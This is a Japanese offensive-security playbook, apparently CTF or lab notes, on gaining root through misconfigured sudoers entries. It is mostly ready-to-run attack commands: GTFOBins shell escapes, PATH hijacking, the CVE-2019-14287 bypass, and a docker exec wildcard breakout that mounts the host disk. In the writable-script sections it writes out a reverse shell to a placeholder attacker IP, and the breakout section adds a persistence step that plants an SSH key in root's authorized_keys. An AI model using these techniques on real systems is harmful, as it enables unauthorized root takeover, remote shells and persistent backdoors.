# sudo 設定不備による権限昇格

## 概要

`/etc/sudoers` の設定ミスにより、特定のコマンドをパスワードなしで root として実行できる場合がある。

---

## 着火条件

```bash
sudo -l
```

出力に `NOPASSWD` または特定コマンドへの許可が含まれている場合。

---

## 観点・着眼点（パターン全体）

**`sudo -l` の出力で何に気付くか：**

| `sudo -l` に見える要素 | 示唆 | 次のアクション |
|--------------------|-----|------------|
| `NOPASSWD:` | パスワード不要で sudo 実行可能 | 該当コマンドを GTFOBins で検索 |
| `(ALL : ALL)` / `(ALL)` | 任意ユーザーとして実行可 | そのまま `sudo -u root [CMD]` |
| `(root)` が明示 | root 権限で実行できる | 昇格経路として最優先 |
| コマンドの末尾が `*`（ワイルドカード） | 引数を自由に指定可能 | サブコマンドや `--config` などから escape を狙う |
| スクリプトパスが `/opt/` / `/home/` 配下 | 自作スクリプトの可能性 | 書き込み権限があれば内容を書き換えて悪用 |
| `env_keep+=LD_PRELOAD` | 環境変数を引き継ぐ | 共有ライブラリ注入（LD_PRELOAD 攻撃） |
| `sudo` のバージョンが 1.8.28 未満 | CVE-2019-14287（`!root` バイパス）候補 | `sudo -u#-1 [CMD]` を試す |
| `docker` / `docker exec` への許可 | コンテナブレイクアウト候補 | パターン4へ |

---

## 典型的な出力パターンと対応

### パターン1: 特定コマンドに NOPASSWD

```
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/python3
(ALL) NOPASSWD: /usr/bin/find
```

→ GTFOBins で対象コマンドの「Sudo」セクションを確認

**悪用手順：**
```bash
# vim / nano / less
sudo vim -c ':!/bin/bash'

# python / python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

**注意点・落とし穴：**
- 絶対パスが指定されている（`/usr/bin/vim`）場合、シンボリックリンクや PATH 経由での呼び出しは通らない。そのパスで呼ぶ
- バイナリが別の場所にも存在し、片方だけ許可されている場合がある。`which vim` で確認
- GTFOBins にない独自コマンドでも、内部で外部コマンドを呼んでいれば PATH ハイジャックで悪用できることがある
- エディタ系（`vim`, `nano`, `less`, `more`, `man`）は「編集機能から外部コマンド実行」が共通パターン

### パターン2: ALL コマンドを許可

```
(ALL) NOPASSWD: ALL
```

→ `sudo /bin/bash` で即座に root

**注意点・落とし穴：**
- これが見えた時点で即 root。他の探索に時間を使わない
- ただし `sudo -l` 実行自体にパスワードが必要なケースがある（`Defaults rootpw` 設定等）。現ユーザーのパスワードを取得してから再実行

### パターン3: 特定スクリプトの実行を許可

```
(ALL) NOPASSWD: /opt/scripts/backup.sh
```

**悪用手順：**
```bash
# スクリプトが書き込み可能な場合 → 直接書き換え
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh
sudo /opt/scripts/backup.sh

# スクリプトが書き込み不可 → スクリプト内から呼ばれる外部コマンドの PATH ハイジャック
# 1. スクリプトを cat で読む
cat /opt/scripts/backup.sh
# 2. フルパスなしで呼ばれているコマンド（例: tar, cp）を確認
# 3. /tmp/tar に偽バイナリを置いて PATH を先頭に注入
echo -e '#!/bin/bash\n/bin/bash' > /tmp/tar && chmod +x /tmp/tar
PATH=/tmp:$PATH sudo /opt/scripts/backup.sh
```

**注意点・落とし穴：**
- スクリプトが書き込み可能か確認: `ls -la /opt/scripts/backup.sh`
- 書き込み不可でも「親ディレクトリが書き込み可能」なら元ファイルを消して同名で作り直せる
- スクリプト内のフルパスなしコマンド（`tar`, `cp`, `date` 等）は PATH ハイジャック対象
- `sudo` は既定で `secure_path` を強制するため単純な PATH 汚染は効かないことが多い。`sudoers` に `env_reset` が無い / `secure_path` が定義されていない時のみ有効

---

## 悪用手順（共通テクニック）

### vim / nano / less

```bash
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

### python / python3

```bash
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### find

```bash
sudo find . -exec /bin/bash \; -quit
```

### awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 任意スクリプトが書き込み可能な場合

```bash
# スクリプトにリバースシェルを追記
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh

# sudo で実行
sudo /opt/scripts/backup.sh
```

---

## 全パターン共通の注意点・落とし穴

- `sudo -l` でパスワードを求められる場合でも、現在のユーザーのパスワードが判明していれば入力できる
- `env_keep` の設定次第では環境変数（`LD_PRELOAD` 等）を引き継いで悪用できる
- sudoers の `!root` 指定（特定ユーザー以外として実行）は古い sudo でバイパスできる場合がある（CVE-2019-14287 → `sudo -u#-1 [CMD]`）
- `sudo -l` は「現在のセッション・ユーザー」に対してしか表示されない。su / ssh で別ユーザーになったら再実行する
- `tty_tickets` が有効だと tty ごとにパスワードキャッシュが分かれる。別シェルで通っても別 tty では通らない

---

## パターン4: docker exec へのワイルドカード NOPASSWD

### 着火条件
`sudo -l` の出力に以下のようなエントリがある場合：

```
(root) NOPASSWD: /snap/bin/docker exec *
(root) NOPASSWD: /usr/bin/docker exec *
```

ワイルドカード `*` により、`docker exec` のオプションを自由に指定できる。

### 観点・着眼点
`docker exec` は実行中コンテナにプロセスを起動する。`--user root` フラグを付けることで、コンテナ内で root として実行できる。さらに、コンテナがホストのブロックデバイス（`/dev/sda1` 等）にアクセスできる場合はホストのファイルシステム全体をマウントして読み書きが可能。

**コンテナIDを特定する方法：**
- `cat /etc/hosts`（コンテナ内からアクセスできている場合）→ ホスト名が16進文字列
- パストラバーサル等で `/etc/hosts` を読み取った場合も同様

### 手順

**ステップ1: コンテナIDの特定**
```bash
# /etc/hosts の確認（コンテナ内でのホスト名 = コンテナID）
# パストラバーサルで読み取った場合も同様
# 出力例: 172.17.0.2   e6ff5b1cbc85
```

**ステップ2: コンテナ内で root として実行できるか確認**
```bash
sudo /snap/bin/docker exec --user root [CONTAINER_ID] id
# uid=0(root) gid=0(root) groups=0(root),...
```

**ステップ3a: コンテナ内でシェルを取得**
```bash
sudo /snap/bin/docker exec --user root [CONTAINER_ID] /bin/sh
# または
sudo /snap/bin/docker exec -it --user root [CONTAINER_ID] /bin/bash
```

**ステップ3b: ホストのブロックデバイスをマウント（Docker ブレイクアウト）**

コンテナが privileged モードで動作しているか、ホストのデバイスにアクセスできる場合：

```bash
# ブロックデバイスの確認
sudo /snap/bin/docker exec --user root [CONTAINER_ID] ls /dev/sd*

# ホストのルートパーティションをマウント
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host'

# ホストのファイルを読み取る
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'cat /mnt/host/root/root.txt'

# ホストに root SSH 公開鍵を書き込む（永続化）
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'echo "ssh-rsa [YOUR_PUBKEY]" >> /mnt/host/root/.ssh/authorized_keys'
```

### 注意点・落とし穴
- コンテナが通常モード（non-privileged）でも `/dev/sda*` が見えることがある。見えたらマウントを試みる
- `-it` フラグ（インタラクティブ + TTY）は TTY を確保するが、環境によっては動作しない。その場合は `-i` のみ、または `sh -c '[COMMAND]'` を使う
- マウント後のパスはコンテナ内のパス。ホストの `/root/root.txt` は `/mnt/host/root/root.txt` でアクセス
- ホストのファイルシステムへの書き込みも可能なため、SSH 鍵の埋め込みや `/etc/passwd` の書き換えも実施できる
- `/dev/sda1` が見つからない場合は `lsblk` で確認。`vda1`・`nvme0n1p1` 等、環境によってデバイス名が異なる

> **なぜコンテナ内からホストのブロックデバイスが見えるのか** — Docker の namespace 分離の仕組み・`/dev/sda1` の命名規則・capability との関係を理解したい場合は `../06_Concepts/Docker_Isolation.md` を参照。

---

## 関連技術
- GTFOBins: https://gtfobins.github.io/
- その他の昇格手法 → `Capabilities.md`, `SUID_SGID.md`
- パストラバーサルでコンテナIDを特定 → `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
- Docker 分離の原理（なぜ効くか） → `../06_Concepts/Docker_Isolation.md`
